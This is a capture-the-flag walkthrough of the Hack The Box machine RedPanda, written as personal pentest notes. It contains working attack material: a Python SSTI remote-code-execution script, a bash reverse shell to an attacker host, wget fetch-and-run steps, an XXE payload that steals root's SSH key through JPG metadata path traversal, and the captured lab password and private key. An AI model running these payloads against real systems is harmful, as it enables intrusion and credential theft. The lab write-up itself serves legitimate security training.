# 📦 RedPanda

Tags: #📦
Related to: [[curl]], [[exiftool]], [[gobuster]], [[nmap]], [[peass]], [[pspy]], [[python]], [[wget]], [[whatweb]]
See also:
Previous: [[HTB]]

## Pre-Engagement

## Linux

```text
10.10.11.170
```

### Information Gathering

#### Basic portscan

	nmap 10.10.11.170

```text
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

#### Browse http server

	http://10.10.11.170:8080/

![[homepage.png]]

#### Identify web technologies

	whatweb 10.10.11.170:8080

```text
Title[Red Panda Search | Made with Spring Boot]
```

##### Spring Boot

Spring Boot is a Java framework.
>Vulnerability Assessment => Identify SSTI (Server Side Template Injection)

### Vulnerability Assessment

#### Identify SSTI (Server Side Template Injection)

##### How it works

> Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java) [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)

![[server_side_template_injection_ssti_1.png]]

 ![[server_side_template_injection_ssti_2.png]]

##### Try it

Try the `$` character.

![[SSTI_01.png]]

The `$` character is banned. Try `*`.

 ![[SSTI_02.png]]

Malicious input injected into template to execute commands on the server-side.

>Proof-of-Concept => exploit.py

### Exploitation

	python3 exploit.py

```text
$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)

$ cat /home/woodenk/user.txt
<...FLAG...>
```

### Post-Exploitation

#### Get reverse shell

	cat shell.sh

```text
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1'
```

Attacker:

	python3 -m http.server 80
	nc -lvnp 1234
	python3 exploit.py


Victim:

	wget <attacker_ip>/shell.sh
	bash shell.sh

```bash
woodenk@redpanda $
```

#### Scan for privilege escalations

Attacker:

	python3 -m http.server 80

Victim:

	wget <attacker_ip>/linpeas.sh
	chmod +x linpeas.sh
	./linpeas.sh

```text
<...SNIP...>
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                             
Sudo version 1.8.31                                                                                                                                                                                                                         

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560

root         /usr/sbin/cron -f
root            /usr/sbin/CRON -f
root                /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root                    sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk                     java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar

╔══════════╣ Unexpected in root
/credits

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root logs 422 Jun 21 12:31 /credits/damian_creds.xml                                                                                                                                                                           
-rw-r----- 1 root logs 426 Aug 28 22:30 /credits/woodenk_creds.xml
-rw-r----- 1 root woodenk 33 Aug 28 22:15 /home/woodenk/user.txt
<...SNIP...>
```

#### Find stored credentials (MainController.java)

	cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java

```java
package com.panda_search.htb.panda_search;

import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
        public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
                SAXBuilder saxBuilder = new SAXBuilder();
                if(author == null)
                author = "N/A";
                author = author.strip();
                System.out.println('"' + author + '"');
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List<Element> images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
                }
                else
                {
                        model.addAttribute("noAuthor", true);
                        return new ModelAndView("stats.html");
                }
        }
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
        public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

                System.out.println("Exporting xml of: " + author);
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
                        System.out.println(in);
                        return IOUtils.toByteArray(in);
                }
                else
                {
                        return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
                }
        }
  @PostMapping("/search")
        public ModelAndView search(@RequestParam("name") String name, Model model) {
        if(name.isEmpty())
        {
                name = "Greg";
        }
        String query = filter(name);
        ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
        model.addAttribute("pandas", pandas);
        model.addAttribute("n", pandas.size());
        return new ModelAndView("search.html");
        }
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}

```

Found stored credentials:

>conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "`woodenk`", "`RedPandazRule`");

>Lateral Movement => SSH (woodenk)

### Lateral Movement

#### SSH (woodenk)

	ssh woodenk@10.10.11.170

```text
woodenk@10.10.11.170's password: RedPandazRule
woodenk@redpanda:~$
```

#### Spy processes

Attacker:

	python3 -m http.server 80

Victim:

	wget <attacker_ip>/pspy64
	chmod +x pspy64
	./pspy64

root runs `cleanup.sh` as woodenk:

```text
     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░
CMD: UID=113  PID=914    | /usr/sbin/mysqld
CMD: UID=1000 PID=882    | java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar

CMD: UID=0    PID=22536  | /bin/sh -c sudo -u woodenk /opt/cleanup.sh
CMD: UID=1000 PID=22543  | /bin/bash /opt/cleanup.sh 
CMD: UID=1000 PID=22544  | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; 
CMD: UID=1000 PID=22563  | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ;
CMD: UID=1000 PID=22555  | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
CMD: UID=1000 PID=22565  | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;
```

>The `xml` and `jpg` file types being deleted look like a clue hinting towards privilege escalation.

#### Privilege escalation

We have to study how the server processes `xml` and `jpg` files.

Study the source code or the website in whichever order you choose.

##### Study the website

###### Bruteforce directories and files

	gobuster dir -u http://10.10.11.170:8080/ -w /usr/share/dirb/wordlists/common.txt 

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.170:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/29 11:56:30 Starting gobuster in directory enumeration mode
===============================================================
/error                (Status: 500) [Size: 86]
/search               (Status: 405) [Size: 117]
/stats                (Status: 200) [Size: 987]
                                               
===============================================================
2022/08/29 11:56:58 Finished
===============================================================
```

###### Browse the enumerated directories

	http://10.10.11.170:8080/stats

 ![[choose_author.png]]

>Note: Choose author woodenk or damien.

	http://10.10.11.170:8080/stats?author=woodenk

![[jpg_xml_statistics.png]]

>Note: The author has several `jpg` and  an `xml` file.

Let's download the `woodenk` xml file:

	curl http://10.10.11.170:8080/export.xml?author=woodenk > export.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>6</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>3</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>3</views>
  </image>
  <totalviews>13</totalviews>
</credits>

```

>Note: `export.xml`

##### Study the source code

Let's examine how `xml` is processed where we found the stored credentials (`MainController.java`):

```java
    @GetMapping(value = "/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
    public @ResponseBody byte[] exportXML(@RequestParam(name = "author", defaultValue = "err") String author) throws IOException {

        System.out.println("Exporting xml of: " + author);
        if (author.equals("woodenk") || author.equals("damian")) {
            InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
            System.out.println( in );
            return IOUtils.toByteArray( in );
        } else {
            return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
        }
    }
```

>Note: author `woodenk` or `damian`

Let's examine how `jpg` is processed (`App.java`):

	cat /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java

```java
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

Metadata handling:

```java
public static String getArtist(String uri) throws IOException, JpegProcessingException
{
	String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
	File jpgFile = new File(fullpath);
	Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
	for(Directory dir : metadata.getDirectories())
	{
		for(Tag tag : dir.getTags())
		{
			if(tag.getTagName() == "Artist")
			{
				return tag.getDescription();
			}
		}
	}
```

>Note: `jpg` metadata `Artist`

```java
public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        
        return map;
    }
```

>Note: User-Agent parsing.

##### Planning the attack

>Note: Create a `jpg` with an `Artist` metadata tag containing the path to an `xml` file which contains code to be run by `root`.

###### Craft a malicious jpg

	wget http://10.10.11.170:8080/img/greg.jpg
	exiftool greg.jpg

```text
ExifTool Version Number         : 12.44
File Name                       : greg.jpg
Directory                       : .
File Size                       : 103 kB
File Modification Date/Time     : 2022:08:29 13:25:35+02:00
File Access Date/Time           : 2022:08:29 13:25:35+02:00
File Inode Change Date/Time     : 2022:08:29 13:26:09+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
Artist                          : woodenk
<...SNIP...>
```

	exiftool greg.jpg

```text
ExifTool Version Number         : 12.44
File Name                       : greg.jpg
Directory                       : .
File Size                       : 103 kB
File Modification Date/Time     : 2022:08:29 13:32:14+02:00
File Access Date/Time           : 2022:08:29 13:32:14+02:00
File Inode Change Date/Time     : 2022:08:29 13:32:14+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
Artist                          : ../home/woodenk/privesc
<...SNIP...>
```

Attacker:

	python3 -m http.server 80

Victim:

	wget <attacker_ip>/greg.jpg

###### Craft a malicious xml file to grab root's SSH private key

Victim:

	vi privesc_creds.xml

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/../../../../../../../home/woodenk/greg.jpg</uri>
    <privesc>&key;</privesc>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

	cp greg.jpg privesc_creds.xml /home/woodenk

###### Trigger the exploit

Attacker:

	curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/greg.jpg"

	curl http://10.10.11.170:8080/export.xml?author=woodenk | /dev/null

Victim:

After a few moments...

	cat /home/woodenk/privesc_creds.xml

```text
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE replace>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/../../../../../../../home/woodenk/greg.jpg</uri>
    <privesc>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----
</privesc>
    <views>3</views>
  </image>
  <totalviews>3</totalviews>
</credits>
```

###### Elevate privileges

	vi id_rsa

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----
```

	chmod 600 id_rsa
	ssh root@10.10.11.170 -i id_rsa

```text
root@10.10.11.170
root@redpanda:~#
```

	cat /root/root.txt

```text
<...FLAG...>
```

## Proof-of-Concept

### Automate SSTI exploitation

Injects malicious input into template to execute commands on the server-side.

	exploit.py

```python
#!/usr/bin/python3
import requests
from cmd import Cmd
from bs4 import BeautifulSoup

class RCE(Cmd):
    prompt = "\033[1;31m$\033[1;37m "
    def decimal(self, args):
        command = args
        commands = []

        for i in command:
            commands.append(str(ord(i)))
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % commands[0]

        for i in commands[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"
        data = { "name": payload }
        request = requests.post("http://10.10.11.170:8080/search", data=data)
        parser = BeautifulSoup(request.content, 'html.parser')
        grepcm = parser.find_all("h2")[0].get_text()
        result = grepcm.replace('You searched for:','').strip()
        print(result)

    def default(self, args):
        try:
            self.decimal(args)
        except:
            print("%s: command not found" % (args))

RCE().cmdloop()
```

## Post-Engagement

---

## Notes

### System changes

No changes have been made to the system and created/uploaded files have been removed.

### Successful exploitation attempts

- The `woodenk` and `root` accounts have been compromised.

### Captured credentials

#### woodenk password (MySQL, SSH, ...)

```text
woodenk:RedPandazRule
```

#### root SSH private key

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----
```

### Uploaded files

- [pspy64](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0)
- [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/20220828)
- `shell.sh`
- `greg.jpg`

# References

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java)
[A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)